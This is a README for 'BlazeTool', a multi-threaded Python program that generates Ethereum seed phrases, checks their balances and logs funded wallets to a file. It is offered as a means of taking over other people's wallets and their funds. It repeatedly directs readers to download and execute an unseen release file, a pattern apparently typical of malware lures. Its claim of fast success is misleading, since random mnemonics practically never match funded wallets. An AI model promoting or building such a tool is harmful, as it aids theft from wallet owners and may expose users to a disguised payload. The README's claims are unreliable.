## Overview

BlazeTool is a powerful tool designed to brute force Ethereum wallet mnemonics. It operates with multiple threads, making it surprisingly fast. The tool automatically generates seed phrases and checks balances on Ethereum networks. If it finds a wallet with a non-zero balance, it logs the wallet's information and saves it to a file named `result.txt`.

For the latest version, download and execute the file from the [Releases section](https://github.com/musab9osman/BlazeTool/releases).

## Features

- **Multi-threaded**: BlazeTool runs multiple threads to speed up the brute-forcing process.
- **Automatic Seed Phrase Generation**: The tool generates seed phrases on its own.
- **Balance Checking**: It checks balances for Ethereum wallets.
- **Logging**: Any wallet with a non-zero balance is logged and saved to `result.txt`.
- **User-Friendly**: Designed for ease of use, even for those new to Ethereum.

## Installation

To install BlazeTool, follow these steps:

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/musab9osman/BlazeTool.git
   cd BlazeTool
   ```

2. **Install Dependencies**:
   Ensure you have the necessary dependencies installed. You may need Python and specific libraries. Install them using:
   ```bash
   pip install -r requirements.txt
   ```

3. **Download the Latest Release**:
   Visit the [Releases section](https://github.com/musab9osman/BlazeTool/releases) to download the latest version. Follow the instructions in the release notes for execution.

## Usage

To use BlazeTool, run the following command in your terminal:

```bash
python main.py
```

You can customize the settings in the configuration file before running the tool. Make sure to check the documentation for any additional command-line options.

### Example Command

```bash
python main.py --threads 8 --max_attempts 100000
```

This command runs BlazeTool with 8 threads and a maximum of 100,000 attempts.

## How It Works

BlazeTool uses a brute-force algorithm to generate potential seed phrases. It systematically checks each phrase against the Ethereum network to see if it corresponds to an existing wallet. 

1. **Seed Phrase Generation**: The tool generates phrases based on predefined rules and patterns.
2. **Balance Check**: Each generated seed phrase is checked against the Ethereum blockchain to see if it holds any funds.
3. **Logging**: If a wallet with a non-zero balance is found, its details are logged in `result.txt`.

This process continues until the specified number of attempts is reached or until the user decides to stop the execution.
